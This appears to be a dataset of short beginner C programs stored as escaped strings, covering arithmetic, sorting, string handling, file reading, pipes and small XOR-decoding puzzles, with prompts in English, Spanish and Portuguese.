    "#include <stdio.h>\nint main(void) {\n    int integer1;\n    int integer2;\n    int sum;\n    printf(\"Enter first integer\\n\");\n    scanf(\"%d\", &integer1);\n    printf(\"Enter second integer\\n\");\n    scanf(\"%d\", &integer2);\n    sum = integer1 + integer2;\n    printf(\"Sum is %d\\n\", sum);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint f(int n) {\n  int accum = 0;\n  for (int i = 0; i < n * n; i++) {\n    accum += 1;\n  }\n  return accum;\n}\nint main() {\n  printf(\"%d\", f(5));\n  return 0;\n}",
    "#include <stdio.h>\nint calcularIndiceMenorValor(int x[], int n)\n{\n int imv = 0;\n for(int i = 1; i < n; i++)\n {\n  if(x[i] < x[imv])\n  {\n   imv = i;\n  }\n }\n return imv;\n}\nint main()\n{\n int n;\n scanf(\"%d\", &n);\n int x[n];\n for(int i = 0; i < n; i++)\n {\n  scanf(\"%d\", &x[i]);\n }\n int imv = calcularIndiceMenorValor(x, n);\n printf(\"Menor valor: %d\\n\", x[imv]);\n printf(\"Posicao: %d\\n\", imv);\n}",
    "#include <stdio.h>\nint main()\n{\n  int Number, Sum, i, Minimum, Maximum;\n  printf(\"\\n Please Enter the Minimum & Maximum Values\\n\");\n  scanf(\"%d %d\", &Minimum, &Maximum);\n  printf(\"Perfect Numbers Between %d and %d are:\\n\", Minimum, Maximum);\n  for(Number=Minimum; Number<=Maximum; Number++)\n   {\n     for(i = 1, Sum =0 ; i < Number ; i++)\n      {\n        if(Number % i == 0)\n          Sum = Sum + i ;\n      }\n     if (Sum == Number)\n       printf(\" %d  \", Number) ;\n   }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\nprintf(\"Hello world \\n\");\nprintf(\"--------My handle CODEKCG23-----------\");\nreturn 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid intercambia( int*, int* );\nint main(){\n    int a = 2;\n    int b = 4;\n    printf(\"a= %d, b= %d\\n\", a, b);\n    intercambia(&a, &b);\n    printf(\"a= %d, b= %d\\n\", a, b);\n    return 0;\n}\nvoid intercambia(int *a, int *b ){\n    int z;\n    z = *a;\n    *a = *b;\n    *b = z;\n}",
    "#include <stdio.h>\n int main(int argc, char const *argv[])\n{\n    int x;\n    printf(\"Enter a number : \");\n    scanf(\"%d\", &x);\n    x % 2 == 0 ? printf(\"Even\") : printf(\"Odd\");\n    return 0;\n}",
    "#include <stdio.h>\nint main (void) {\n    FILE *fp;\n    char diary1[60];\n    char date1[8];\n    printf(\"Please input today's date (example:20200218): \");\n    scanf(\"%s\", date1);\n    fp = fopen(date1, \"w\");\n    printf(\"Please input today's one-line diary (max:60 characters)\\n don't use space, please use underbar(_) \\ninput > \");\n    scanf(\"%s\", diary1);\n    fputs(diary1, fp);\n    fclose(fp);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stddef.h>\nstatic size_t sss;\nint main(void)\n{\n  printf (\"+++size_t alignment:\\n\");\n  printf (\"%d\\n\", __alignof__ (sss));\n  return 0;\n}",
    "#include <stdio.h>\nunsigned int invert(int x, int p, int n);\nint main(void)\n{\n  unsigned int x = 0b11010111;\n  printf(\"%c%c%c%c%c%c%c%c\\n\", (x & 128 ? '1' : '0'), (x & 64 ? '1' : '0'), (x & 32 ? '1' : '0'), (x & 16 ? '1' : '0'), (x & 8 ? '1' : '0'), (x & 4 ? '1' : '0'), (x & 2 ? '1' : '0'), (x & 1 ? '1' : '0'));\n  printf(\"%c%c%c%c%c%c%c%c\\n\", (invert(x, 1, 4) & 128 ? '1' : '0'), (invert(x, 1, 4) & 64 ? '1' : '0'), (invert(x, 1, 4) & 32 ? '1' : '0'), (invert(x, 1, 4) & 16 ? '1' : '0'), (invert(x, 1, 4) & 8 ? '1' : '0'), (invert(x, 1, 4) & 4 ? '1' : '0'), (invert(x, 1, 4) & 2 ? '1' : '0'), (invert(x, 1, 4) & 1 ? '1' : '0'));\n  return 0;\n}\nunsigned int invert(int x, int p, int n)\n{\n  ++p;\n  unsigned int mask1 = ~(~0 << n) << p;\n  unsigned int mask2 = ~mask1 & x;\n  return mask2 | ~x;\n}",
    "#include <stdio.h>\n#include <string.h>\nint main(int argc, char *argv[]) {\n    int match = 0;\n    if (argc != 3) {\n        puts(\"Usage: find-pattern text pattern\");\n    } else {\n        char *text = argv[1];\n        char *pattern = argv[2];\n        char *pch = ((void*)0);\n        while ((pch = strstr(text, pattern)) != ((void*)0)) {\n            match++;\n            text = ++pch;\n        }\n    }\n    printf(\"Find %d patterns.\", match);\n}",
    "#include <stdio.h>\nint inverte(int a)\n{\n int aux, tam = 1, i, j = 1, num_inver = 0;\n while(1)\n {\n  if(a >= tam && a < tam*10) break;\n  tam = tam * 10;\n }\n aux = tam;\n for(i = 10 ; i <= tam ; i = i * 10)\n {\n  num_inver = num_inver + ((a % i) / j)*aux;\n  j = j * 10;\n  aux = aux / 10;\n }\n return (num_inver + (a / tam));\n}\nint main ()\n{\n int a, b, i, n, cont = 0;\n scanf(\"%d\", &n);\n for(i = 0 ; i < n ; ++i)\n {\n  scanf(\"%d\", &a);\n  if (a < 10) printf(\"%d %d\\n\", cont, a);\n  else if(a == inverte(a)) printf(\"%d %d\\n\", cont, a);\n  else\n  {\n   while(1)\n   {\n    ++cont;\n    b = inverte(a);\n    if((a + b) == inverte((a + b)))break;\n    else a = a + b;\n   }\n  printf(\"%d %d\\n\", cont, (a + b));\n  cont = 0; a = 0; b = 0;\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <math.h>\n#include <ctype.h>\nint main(void)\n{\n    int m, n;\n    scanf(\"%d%d\", &m, &n);\n    int area_bord = m*n;\n    printf(\"%d\\n\", (int)area_bord/2);\n    return 0;\n}",
    "#include <stdio.h>\nint faltandias(int d, int m);\nint main(void){\n    int result;\n    int d,m;\n    printf(\"Dias de hoy numero\\n\");\n    scanf(\"%d\",&d);\n    printf(\"Mes numero\\n\");\n    scanf(\"%d\",&m);\n    result = faltandias(d,m);\n    printf(\"El numero de dias es: %d\",result);\n    return 0;\n}\nint faltandias(int dd,int mm){\n    int dias = 0;\n    switch ( mm ){\n      case 1 : dias = dias + 31;\n      case 2 : dias = dias + 28;\n      case 3 : dias = dias + 31;\n      case 4 : dias = dias + 30;\n      case 5 : dias = dias + 31;\n      case 6 : dias = dias + 30;\n      case 7 : dias = dias + 31;\n      case 8 : dias = dias + 31;\n      case 9 : dias = dias + 30;\n      case 10 : dias = dias + 31;\n      case 11 : dias = dias + 30;\n      case 12 : dias = dias + 31;\n      break;\n      default : printf( \"\\n   ERROR: Dia incorrecto.\" );\n   }\n    return dias-dd;\n}",
    "#include <stdio.h>\nint main(){\n  char s1[] = {42, 98, 118, 101, 127, 114, 99, 54, 87, 125, 58, 84, 38, 110, 122, 105, 109, 17, 18, 19};\n  char s2[20];\n  int i;\n  for(i = 0; i < 20; i++) {\n    s2[i] = s1[i] ^ i;\n  }\n  printf(\"%s\", s2);\n}",
    "#include <stdio.h>\n#include <math.h>\nint main(){\n double W,H,w,h;\n scanf(\"%lf %lf %lf %lf\",&W,&H,&w,&h);\n double s1,s2;\n s1 = w/W;\n s2 = h/H;\n printf(\"%.10f %.10f\\n\",s1,s2);\n int ans1 = 0;\n int times = 0;\n while(s1 != 1){\n  s1 *= 2;\n  int n = floor(s1);\n  ans1 += n;\n  times++;\n  if(times > 200){\n   printf(\"-1\");\n   return 0;\n  }\n }\n int ans2 = 0;\n times = 0;\n while(s2 != 1){\n  s2 *= 2;\n  int n = floor(s2);\n  ans2 += n;\n  times++;\n  if(times > 200){\n   printf(\"-1\");\n   return 0;\n  }\n }\n int ans = ans1+ans2;\n printf(\"%d\",ans);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void){\n int x = 0, y = 1, z = 1, iContador1 = 0, iContador2 = 0, iParo;\n printf(\"Este programa imprime la Seria de Fibonacci\");\n printf(\"\\nDesde el 0 hasta el n%cmero que le indiques\",163);\n printf(\"\\n%cCu%cntos n%cmeros quieres? \",168,160,163);\n scanf(\"%d\",&iParo);\n if(iParo <= 0){\n  printf(\"ERROR. El n%cmero debe ser positivo y mayor a cero\",163);\n }else if(iParo == 1){\n  printf(\"\\nN%cmero\\t|Fibonacci\",163);\n  printf(\"\\n%d\\t|%d\",++iContador1,x);\n }else if(iParo == 2){\n  printf(\"\\nN%cmero\\t|Fibonacci\",163);\n  printf(\"\\n%d\\t|%d\",iContador1,x);\n  printf(\"\\n%d\\t|%d\",++iContador1,y);\n }else{\n  iContador1 = iContador2;\n  iContador2++;\n  printf(\"\\nN%cmero\\t|Fibonacci\",163);\n  printf(\"\\n%d\\t|%d\",iContador2,x);\n  printf(\"\\n%d\\t|%d\",++iContador2,y);\n  for(iContador1 = 0; iContador1 < iParo-2; iContador1++){\n   z = x +y;\n   iContador2++;\n   printf(\"\\n%d\\t|%d\",iContador2,z);\n   x = y;\n   y = z;\n  }\n  getchar();\n }\n return 0;\n}",
    "#include<stdio.h>\nint main(){\n    printf(\"What is your age?\\n> \");\n    int age;\n    scanf(\"%d\",&age);\n    printf(\"You've experienced nearly %ld seconds.\\n\", (long)(age * 3.156e7));\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <stdlib.h>\n\n_Bool is_vowel(char c) {\n  if (c == 'A' || c == 'a' || c == 'E' || c == 'e' || c == 'I' || c == 'i' || c == 'O' || c == 'o' || c == 'U' || c == 'u'){\n    return 1;\n  } return 0;\n}\nint copy_non_vowels(int num_chars, char* in_buf, char* out_buf) {\n  int index = 0;\n  for (int i=0; i < num_chars - 1; i++) {\n    if (is_vowel(in_buf[i]) == 0){\n      out_buf[index] = in_buf[i];\n      index++;\n    }\n  }\n  return index;\n}\nvoid disemvowel(FILE* inputFile, FILE* outputFile) {\n  char* in_buf = (char*)calloc(1024, sizeof(char));\n  char* out_buf = (char*)calloc(1024, sizeof(char));\n  int b = 1024;\n  int k = 0;\n  while (b == 1024) {\n    b = (int)fread(in_buf, sizeof(char), 1024, inputFile);\n    k = (int)copy_non_vowels(b, in_buf, out_buf);\n    fwrite(out_buf, sizeof(char), k, outputFile);\n  }\n  free(in_buf);\n  free(out_buf);\n}\nint main(int argc, char *argv[]) {\n  FILE *inputFile;\n  FILE *outputFile;\n  if (argc == 1) {\n    inputFile = (stdin);\n    outputFile = (stdout);\n  }\n  else if (argc == 2) {\n    inputFile = fopen(argv[1], \"r\");\n    outputFile = (stdout);\n  }\n  else if (argc == 3){\n    inputFile = fopen(argv[1], \"r\");\n    outputFile = fopen(argv[2], \"w\");\n  } else {\n    printf(\"You have given me too many arguments! Please only give me at most two arguments.\");\n    exit(0);\n  }\n  disemvowel(inputFile, outputFile);\n  fclose(inputFile);\n  fclose(outputFile);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a,b;\n    float sum,count;\n    scanf(\"%d\",&a);\n    int clone=a;\n    int i=0;\n    for(;i<a;i++){\n        b=clone % 10;\n        sum +=b;\n        a/=10;\n        count+=1;\n    }\n    sum = sum/count;\n    if(sum>=7.00) printf(\"heavy\\n\");\n    else printf(\"light\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdbool.h>\nvoid _gets(char* string, int max_size) {\n fgets(string, max_size + 1, (stdin));\n int size = 0;\n for (int i = 0; string[i] != '\\0'; ++i) size++;\n string[size - 1] = '\\0';\n}\n_Bool areAnagrams(char* str1, char* str2) {\n int freq1[26];\n int freq2[26];\n for (int i = 0; i < 26; ++i)\n  freq1[i] = freq2[i] = 0;\n for (int i = 0; str1[i] != '\\0'; ++i) freq1[str1[i] - 'a']++;\n for (int i = 0; str2[i] != '\\0'; ++i) freq2[str2[i] - 'a']++;\n for (int i = 0; i < 26; ++i)\n  if (freq1[i] != freq2[i])\n   return 0;\n return 1;\n}\nint main(){\n int size = 1001;\n char str1[size], str2[size];\n _gets(str1, size);\n _gets(str2, size);\n printf (\"%s\\n\", areAnagrams(str1, str2) ? \"True\" : \"False\");\n return 0;\n}",
    "#include <stdio.h>\nvoid swap(int *x, int *y)\n{\n    int tmp;\n    if (*x > *y)\n    {\n        tmp = *y;\n        *y = *x;\n        *x = tmp;\n    }\n}\nint main()\n{\n    int a, b, c;\n    scanf(\"%d %d %d\", &a, &b, &c);\n    swap(&a, &b);\n    swap(&a, &c);\n    swap(&b, &c);\n    printf(\"%d %d %d\\n\", a, b, c);\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <unistd.h>\nint check(int n){\n    int count = 0, temp=n, value = n;\n    while(temp != 0){\n        temp = temp/10;\n        count++;\n    }\n    if(count == 1)\n        return 0;\n    int sum=0, rem;\n    while(n != 0){\n        rem = n % 10;\n        sum += pow(rem, count);\n        n = n/10;\n    }\n    if(value == sum)\n        return 1;\n    else\n        return 0;\n}\nvoid armstrong(int arr[], int res_arr[], int n){\n    for(int i=0; i<n; i++){\n        res_arr[i] = check(arr[i]);\n    }\n}\nvoid display(int arr[], int n){\n    printf(\" - Array: \");\n    for(int i=0; i<n; i++){\n        printf(\"%d \", arr[i]);\n    }\n    printf(\"\\n\");\n}\nint main() {\n    int pipeFDS_1[2], pipeFDS_2[2];\n    pid_t pid;\n    int size;\n    printf(\"\\n Enter the size of array: \");\n    scanf(\"%d\", &size);\n    int parent_send[size], parent_received[size];\n    int child_send[size], child_receive[size];;\n    if(pipe(pipeFDS_1) == -1){\n        printf(\"\\n Error in Pipe 1 creation..\");\n        return 0;\n    }\n    if(pipe(pipeFDS_2) == -1){\n        printf(\"\\n Error in Pipe 2 creation..\");\n        return 0;\n    }\n    pid = fork();\n    if(pid == 0){\n        close(pipeFDS_2[0]);\n        close(pipeFDS_1[1]);\n        read(pipeFDS_1[0], child_receive, sizeof(child_receive));\n        printf(\" Child Received from parent\");\n        display(child_receive, size);\n        armstrong(child_receive, child_send, size);\n        printf(\"\\n Child Sent:\\n\\n\");\n        display(child_send, size);\n        write(pipeFDS_2[1], child_send, sizeof(child_send));\n    } else {\n        close(pipeFDS_1[0]);\n        close(pipeFDS_2[1]);\n        printf(\"\\n Enter the array: \");\n        for(int i=0; i<size; i++)\n            scanf(\"%d\", &parent_send[i]);\n        printf(\"\\n Parent Send\");\n        display(parent_send, size);\n        write(pipeFDS_1[1], parent_send, sizeof(parent_send));\n        read(pipeFDS_2[0], parent_received, sizeof(parent_received));\n        printf(\"\\n Parent ..\");\n        for(int i=0; i<size; i++){\n            if(parent_received[i] == 0)\n                printf(\"\\n %d is NOT Armstrong. \", parent_send[i]);\n            else\n                printf(\"\\n %d is Armstrong. \", parent_send[i]);\n        }\n    }\n    return 0;\n}",
    "#include <stdarg.h>\n#include <stdio.h>\nvoid f(int n, ...)\n{\n va_list orig, copy;\n int i;\n __builtin_va_start(orig, n);\n __builtin_va_copy(copy, orig);\n for (i = 0; i < n; i++) {\n  printf(\"%f and %f\\n\", __builtin_va_arg(orig, double), __builtin_va_arg(copy, double));\n }\n __builtin_va_end(orig);\n __builtin_va_end(copy);\n}\nint main()\n{\n f(3, 1.0, 2.0, 3.0);\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n int i = 0;\n char c = 0;\n char *s = \"teste\";\n void *p = ((void*)0);\n printf(\"%d %c %s %p\\n\", i, c, s, p);\n if (!c) printf(\"i ok\\n\");\n if (!c) printf(\"c ok\\n\");\n if (!s[5]) printf(\"s ok\\n\");\n if (!p) printf(\"p ok\\n\");\n}",
    "#include <stdio.h>\n\n\nvoid prog(int x, int y, int z) {\n int arr[4] = {};\n arr[(x>y) + (x>z)] = x;\n arr[(y>x) + (y>z)] = y;\n arr[(z>x) + (z>y)] = z;\n if (0) {\n  printf(\"The integers in order are: %d %d %d\\n\", arr[0], arr[1], arr[2]);\n }\n arr[(arr[0] != 0) * 3] = arr[1];\n arr[((arr[1] != 0) * 3) + (arr[1] == 0)] = arr[0];\n arr[((arr[2] != 0) * 3) + (arr[2] == 0)*2] = arr[1];\n printf(\"The integers in order are: %d %d %d\\n\", arr[0], arr[1], arr[2]);\n if (0) {\n  printf(\"-----\\n\");\n }\n}\nint main () {\n int inputs[3] = {};\n if (!0) {\n  printf(\"Enter integer: \");\n  scanf(\"%d\", &inputs[0]);\n  printf(\"Enter integer: \");\n  scanf(\"%d\", &inputs[1]);\n  printf(\"Enter integer: \");\n  scanf(\"%d\", &inputs[2]);\n  prog(inputs[0],inputs[1],inputs[2]);\n } else {\n  int test[4][3] = {\n   {1,1,2},\n   {1,2,1},\n   {2,1,1},\n   {1,1,1}\n  };\n  for (int i = 0; i < 4; i++) {\n   prog(test[i][0], test[i][1], test[i][2]);\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\nchar *ordinal(int v)\n{\n if(v % 10 == 1 && v % 100 != 11){\n  return \"st\";\n }\n else if(v % 10 == 2 && v % 100 != 12){\n  return \"nd\";\n }\n else if(v % 10 == 3 && v % 100 != 13){\n  return \"rd\";\n }\n else{\n  return \"th\";\n }\n}\nint main()\n{\n int c;\n for( c=1; c<=20; c++ )\n {\n  printf(\"%3d%s\\t%3d%s\\t%3d%s\\t%3d%s\\t%3d%s\\n\",\n    c, ordinal(c),\n    c+20, ordinal(c),\n    c+40, ordinal(c),\n    c+60, ordinal(c),\n    c+80, ordinal(c)\n     );\n }\n return(0);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(){\n int i = 0;\n char *ptr;\n char input[17] = {0, };\n char test[17] = {15,19,6,14,21,11,7,11,33,21,26,40,1,11,4,74,0};\n char A[17] = \"HackabilityCheck\";\n for(i = 0; i < 16; i++)\n  input[i] = A[i] ^ test[i];\n    printf(\"%s\", input);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main() {\n    int numeroRecebido;\n    int vetorAntessessor[2];\n    int vetorSucessor[2];\n    int i, numeroRecebidoAux;\n    printf(\"Informe um numero inteiro: \");\n    scanf(\"%d\", &numeroRecebido);\n    numeroRecebidoAux = numeroRecebido;\n    for(i = 0; i < 2; i++) {\n        vetorAntessessor[i] = --numeroRecebido;\n        vetorSucessor[i] = ++numeroRecebidoAux;\n    }\n    printf(\"Os Antessessores s\u00e3o: %d e %d\\n\", vetorAntessessor[0], vetorAntessessor[1]);\n    printf(\"Os Sucessores s\u00e3o: %d e %d\\n\", vetorSucessor[0], vetorSucessor[1]);\n    return 0;\n}",
    "#include <stdio.h>\nvoid printArr(int array[], int len) {\n  printf(\"The values of returned are:\\n\");\n  for (int j = 0; j < len; j++)\n    printf(\"%d \", array[j]);\n  printf(\"\\n\");\n  return;\n}\nvoid sort(int array[], int len) {\n  for (int i = 0; i < len; i++) {\n    for (int j = i + 1; j < len; j++) {\n      if (array[j] < array[i]) {\n        int _temp = array[i];\n        array[i] = array[j];\n        array[j] = _temp;\n      }\n    }\n  }\n  return;\n}\nint main() {\n  int arrIn[50] = {};\n  int i = 0;\n  while (scanf(\"%d\", & arrIn[i++]) != (-1));\n  sort(arrIn, i - 1);\n  printArr(arrIn, i - 1);\n  return 0;\n}",
    "#include <stdio.h>\nint node[70], leaf[70];\nint find(int a){\n    if(node[a]==-1){\n        return 1;\n    }else if(node[a]==-2){\n        return 0;\n    }else{\n        return find(node[a]);\n    }\n}\nint main(void){\n    int n, cnt = 0;\n    scanf(\"%d\", &n);\n    for(int i=0;i<n;i++){\n        scanf(\"%d\", &node[i]);\n        if(node[i]!=-1) leaf[node[i]]++;\n    }\n    int del;\n    scanf(\"%d\", &del);\n    leaf[node[del]]--;\n    node[del] = -2;\n    for(int i=0;i<n;i++){\n        if(!leaf[i]) cnt += find(i);\n    }\n    printf(\"%d\", cnt);\n    return 0;\n}",
    "int\nmain ()\n{\nreturn main ();\n  ;\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int mes, qtdDias;\n printf(\"Digite o m\u00eas :\" ); scanf(\" %d\", &mes);\n if( mes == 2 )\n  qtdDias = 28;\n else if (mes == 4 || mes == 6 || mes == 9 || mes == 11 )\n   qtdDias = 30;\n  else\n   qtdDias = 31;\n printf(\"O m\u00eas %d tem %d dias.\\n\", mes, qtdDias);\n return 0;\n}",
    "#include <stdio.h>\nvoid count()\n{\n}\nvoid static_count()\n{\n}\nint main()\n{\n count();\n count();\n static_count();\n static_count();\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void)\n{\n    FILE *fp;\n    int n, sum = 0, i, tnum = 0;\n    double avg;\n    fp = fopen(\"./numbers.txt\", \"r\");\n    if (fp == ((void*)0))\n    {\n        printf(\"Cannot open file.\\n\");\n        exit(-1);\n    }\n    while (fscanf(fp, \"%d\", &n) != (-1))\n    {\n        sum += n;\n        tnum++;\n    }\n    avg = (double) sum / tnum;\n    printf(\"%-8s= %d\\n\"\n           \"%-8s= %f\\n\", \"Sum\", sum, \"Average\", avg);\n    fclose(fp);\n}",
    "#include <stdio.h>\nint main (){\n    float l;\n    printf (\"Digite o tamanho do lado do quadrado: \");\n    scanf (\"%f\", &l);\n    printf (\"Lado do quadrado: %.2f \\nArea do quadrado: %.2f\", l, l * l);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    printf(\"Happy Friday Eve!\\n\");\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nint printFile(const char *fileName)\n{\n FILE *fp = (FILE *)((void*)0);\n if ((fp = fopen(fileName, \"r\")))\n {\n  char buffer[512];\n  unsigned int lNumber = 0;\n  while (fgets(buffer, 512, fp))\n  {\n   printf(\"%3d: %s\", ++lNumber, buffer);\n  }\n  fclose(fp);\n  return 0;\n }\n return 1;\n}\nvoid inputFiltering(char *fName)\n{\n char buf[256]=\"\";\n char *c = fName, *b = buf;\n for (;*c != '\\0';c++)\n {\n  while (*c == '/') c++;\n  *b++ = *c;\n }\n strncpy(fName, buf, 255);\n}\nint main(int argc, char *argv[])\n{\n if (argc > 1)\n {\n  char fName[256] = \"\";\n  strncpy(fName, argv[1], 255);\n  inputFiltering(fName);\n  if (printFile(fName))\n  {\n   printf(\"Argument error, the file is not readable.\\n\");\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main() {\n    double logt =log10(2.0);\n    double num;\n    double e;\n    double i;\n    int min;\n    unsigned aux;\n    while (scanf(\"%lf\", &num) != (-1)) {\n        for (aux = (unsigned)num, min = 1; aux/=10; min++);\n        for (i = (double)min+1.0; ; i += 1.0)\n            if ((e = ceil((log10(num) + i)/logt)) == floor((log10(num+1.0) + i)/logt))\n                break;\n        printf(\"%.0lf\\n\", e);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid shellsort(char input[], int length);\nvoid shellsort(char v[], int n)\n{\n    int gap, i, j, temp;\n    for (gap = n / 2; gap > 0; gap /= 2) {\n        for (i = gap; i < n; i++) {\n            for (j = i - gap; j >= 0 && v[j] > v[j + gap]; j -= gap) {\n                temp = v[j];\n                v[j] = v[j + gap];\n                v[j + gap] = temp;\n            }\n        }\n    }\n}\nint main(int argc, char *argv[])\n{\n    int i;\n    char potato[] = \"Potato\";\n    printf(\"%s\\n\", potato);\n    shellsort(potato, 6);\n    printf(\"%s\\n\", potato);\n    int c = 1;\n    int a = c++;\n    int d = ++c;\n    int b = ++c;\n    printf(\"%d %d %d\\n\", a, d, b);\n    return 0;\n}",
    "#include <stdio.h>\nint prod_arr(int arr[], int n) {\n   int result = 1;\n   for (int i = 0; i < n; i++)\n   result = result * arr[i];\n   return result;\n}\nint main() {\n   int arr[] = { 10, 20, 3, 4, 8 };\n   int n = sizeof(arr) / sizeof(arr[0]);\n   printf(\"%d\", prod_arr(arr, n));\n   return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n int i, n, odd, square;\n printf(\"This program prints a table of squares.\\n\");\n printf(\"Enter number of entries in table: \");\n scanf(\"%d\", &n);\n i = 1;\n odd = 3;\n for(square = 1; i <= n; odd+=2)\n {\n  printf(\"%10d%10d\\n\", i, square);\n  ++i;\n  square += odd;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n  printf(\"hello world\\n\");\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int first, second, third, forth, fifth;\n printf(\"Enter ISBN: \");\n scanf(\"%d-%d-%d-%d-%d\", &first, &second, &third, &forth, &fifth);\n printf(\"GS1 prefix: %d\\n\", first);\n printf(\"Group identifier: %d\\n\", second);\n printf(\"Publisher code: %d\\n\", third);\n printf(\"Item number: %d\\n\", forth);\n printf(\"Check digit: %d\\n\", fifth);\n return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int a, b, c;\n    printf(\"enter three integer number\\n\");\n    scanf(\"%d%d%d\", &a, &b, &c);\n    if(a > b)\n        if(a > c)\n            printf(\"a is greatest\");\n        else\n            printf(\"c is greatest\");\n    else if(b > c)\n        printf(\"b is greatest\");\n    else\n        printf(\"c is greatest\");\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int variableSinUsar = 1;\n  printf(\"Hola mundo. Soy un programa en C\");\n  return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int N;\n    int a,b,c;\n    a=1;\n    b=1;\n    c=1;\n    int count=0;\n    scanf(\"%d\", &N);\n    while(a<=N)\n    {\n        b=1;\n        while(b<=N)\n        {\n           c=1;\n           while(c<=N)\n            {\n                if(a<b+c&&b<a+c&&c<a+b&&(a>=b&&b>=c))\n                {\n                    count+=1;\n                }\n                c+=1;\n            }\n            b+=1;\n        }\n        a+=1;\n    }\n    printf(\"Number of possible triangles is %d\", count);\n    return 0;\n}",
    "#include <stdio.h>\nint main (){\n  int n1, n2;\n  float c;\n  scanf(\"%d %d\", &n1, &n2);\n  if (n1 == 1){\n      c = 4 * n2;\n  }\n  if (n1 == 2){\n    c = 4.5 * n2;\n  }\n  if (n1 == 3) {\n    c = 5 * n2;\n  }\n  if (n1 == 4) {\n    c = 2 * n2;\n  }\n  if (n1 == 5) {\n    c = 1.5 * n2;\n  }\n  printf(\"Total: R$ %.2f\\n\", c);\n  return 0;\n}",
    "#include <stdio.h>\n\nvoid Shift(int array[], int num);\nvoid printArray(int array[]);\nint main(){\n    int array[10], i;\n    for (i=0; i<10; i++) array[i] = i+1;\n    for(i=1;i<=5;i++) Shift(array,2);\n    return 0;\n}\nvoid Shift(int array[10], int num){\n    while (num > 10) num = num-((int)(num/10))*(10);\n    if (num >= 10) return;\n    int newarray[10] = {},i;\n    for(i=10 -num; i<10; i++) newarray[i-(10 -num)] = array[i];\n    for(i=0; i<10 -num; i++) newarray[i+num] = array[i];\n    for (i=0; i<10; i++) array[i] = newarray[i];\n    printArray(array);\n    return;\n}\nvoid printArray(int array[]){\n    int i;\n    for (i=0; i<10; i++) printf(\"%d \", array[i]);;\n    printf(\"\\n\");\n    return;\n}",
    "#include <math.h>\n#include <stdio.h>\nint main(){\n    int input;\n    int total = 0;\n    while (scanf(\"%i\", &input) == 1) {\n        total += pow(input / 10, input % 10);\n    }\n    printf(\"%i\\n\", total);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <locale.h>\n\n\nint main(void)\n{\n    system(\"cls\");\n    setlocale(6, \"portuguese\");\n    int i, j;\n    int matriz[3][3];\n    for (i = 0; i < 3; i++)\n    {\n        printf(\"\\n Digite os Elementos da %d? linha da Matriz. \\n\", i + 1);\n        for (j = 0; j < 3; j++)\n        {\n            printf(\"\\n %d? Elemento da  linha da Matriz: \", j + 1);\n            scanf(\"%d\", &matriz[i][j]);\n            getchar();\n        }\n    }\n    printf(\"\\n\");\n    for (i = 0; i < 3; i++)\n    {\n        for (j = 0; j < 3; j++)\n        {\n            printf(\" %d \", matriz[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    printf(\"\\n\\n\\n\");\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[]) {\n char nome[30];\n char endereco[30];\n int idade;\n printf(\"Nome \\n\");\n scanf(\"%s\",&nome);\n printf(\"Endereco \\n\");\n scanf(\"%s\",&endereco);\n printf(\"Idade \\n\");\n scanf(\"%d\",&idade);\n printf(\"\\n Nome: %s\", nome);\n printf(\"\\n Endereco: %s\", endereco);\n printf(\"\\n Idade: %d\", idade);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint comparator(const void *l, const void *r){\n int f = *(const int *)l;\n int s = *(const int *)r;\n return f-s;\n}\nint main(int argc, char *argv[]){\n int a[] = {3, 2, 5, 6, 11, 13, 40, 66, 34, 12, 90, 100, 78, 44, 34, 22, 25};\n int size = sizeof(a)/sizeof(a[0]);\n int x = 45 ;\n qsort((void *)a, size, sizeof(a[0]), comparator);\n int l = 0, r = size - 1, count = 0;\n while(l <= r)\n {\n  if(a[l] + a[r] == x){\n   printf(\"%d + %d = %d\\n\",a[l], a[r], x);\n   count++;\n   l++;\n   r--;\n  }\n  else if(a[l] + a[r] > x)\n   r--;\n  else\n   l++;\n }\n printf(\"\\n Count is %d\\n\",count);\n return 0;\n}",
    "#include<stdio.h>\nint main(int argc, char const *argv[])\n{\n    double x=0,p0=1,p1=0,pn=0;\n    int n=0;\n    scanf(\"%lf %d\",&x,&n);\n    p1=x;\n    if(n==0){\n        printf(\"%.2lf\",1.00);\n    }else if (n==1)\n    {\n        printf(\"%.2lf\",x);\n    }else if (n>1)\n    {\n        for (int i = 2; i <=n; i++)\n        {\n            pn=((double)(2*i-1)/i)*x*p1-((double)(i-1)/i)*p0;\n            p0=p1;\n            p1=pn;\n        }\n        printf(\"%.2lf\",pn);\n    }\n    return 0;\n}",
